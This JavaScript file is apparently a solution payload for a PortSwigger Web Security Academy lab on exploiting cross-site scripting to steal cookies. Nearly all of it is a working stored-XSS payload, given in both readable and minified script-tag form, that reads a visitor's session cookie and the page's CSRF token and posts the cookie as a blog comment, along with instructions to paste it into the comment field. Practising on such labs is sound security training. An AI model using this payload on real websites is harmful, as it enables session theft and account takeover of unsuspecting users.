// The code below serves as a payload to solve the following lab:
// https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

// The code takes a users cookie and his CSRF token and then posts it as a comment to the first post of the blog, i.e:
// https://<SUB_DOMAIN>.web-security-academy.net/post?postId=1

// The code has to be wrapped in a document event listener because the form exists in the DOM AFTER the payload script.
// Don't forget to place all this code between <script> tags before you paste it as a comment on the blog.
// Or You can take the minified version of this script below, which is already in script tags.

// <script>document.addEventListener("DOMContentLoaded",(function(){const e=encodeURIComponent(document.cookie),o={csrf:document.getElementsByTagName("form")[0].querySelector('input[type="hidden"][name="csrf"]').value,postId:1,comment:e,name:encodeURIComponent("FakeName"),email:encodeURIComponent("fakeemail@example.com"),website:encodeURIComponent("https://www.example.com")},n=Object.keys(o).map((e=>`${e}=${o[e]}`)).join("&");fetch("/post/comment",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:n}).then((e=>e.text())).then((e=>{console.log("Success!")})).catch((e=>{console.error("Failure...")}))}));</script>

document.addEventListener('DOMContentLoaded', function() {
    const cookie = encodeURIComponent(document.cookie);
    const form = document.getElementsByTagName('form')[0];
    const csrfInput = form.querySelector('input[type="hidden"][name="csrf"]');
    const csrf = csrfInput.value;

    const comment = {
        csrf: csrf,
        postId: 1,
        comment: cookie,
        name: encodeURIComponent("FakeName"),
        email: encodeURIComponent("fakeemail@example.com"),
        website: encodeURIComponent("https://www.example.com")
    };

    const requestBody = Object.keys(comment)
    .map(key => `${key}=${comment[key]}`)
    .join('&');

    fetch('/post/comment', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: requestBody
    })
        .then(response => response.text())
        .then(data => {
        console.log("Success!");
        })
        .catch(error => {
        console.error("Failure...");
    });
});
